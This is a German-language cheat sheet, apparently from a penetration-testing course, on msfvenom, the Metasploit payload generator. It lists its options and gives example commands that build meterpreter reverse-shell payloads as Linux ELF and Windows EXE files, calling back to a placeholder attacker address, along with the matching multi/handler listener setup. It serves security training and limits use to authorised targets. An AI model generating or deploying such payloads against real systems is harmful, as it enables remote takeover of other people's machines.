# msfvenom

**Kategorie:** Payload-Generator (Metasploit)

Erzeugt eigenständige **Payloads** in vielen Formaten/Plattformen (ELF, EXE, Web, Script, Shellcode) – für Situationen ohne fertigen Exploit. Der Payload verbindet sich (reverse) zu einem `multi/handler`-Listener.

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <datei>
```

## Wichtigste Optionen

| Option | Bedeutung |
|--------|-----------|
| `-p <payload>` | Payload (z. B. `linux/x64/meterpreter/reverse_tcp`) |
| `LHOST=` / `LPORT=` | Listener-Adresse/-Port (reverse) |
| `-f <format>` | Ausgabeformat (`elf`, `exe`, `raw`, `python`, `war`, `apk` …) |
| `-a <arch>` / `--platform <os>` | Architektur / Plattform |
| `-e <encoder>` `-i <n>` | Encoder + Iterationen (≠ echtes AV-Evasion!) |
| `-o <datei>` | Ausgabedatei |
| `-l payloads\|formats\|encoders` | Listen anzeigen |
| `-b '<bad chars>'` | Bad Characters ausschließen |

## Beispiele

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe
msfvenom -l payloads | grep meterpreter
```

## Passender Listener

```
use exploit/multi/handler
set PAYLOAD <gleicher payload>
set LHOST <KALI>; set LPORT 4444
run
```

## Hinweis

Payload, LHOST und LPORT müssen **exakt** zwischen msfvenom und Handler übereinstimmen. Encoding umgeht kein modernes AV/EDR. Nur eigene/freigegebene Ziele.

## Verwendet in

exploitation-metasploit 06 (msfvenom & handler), 10.
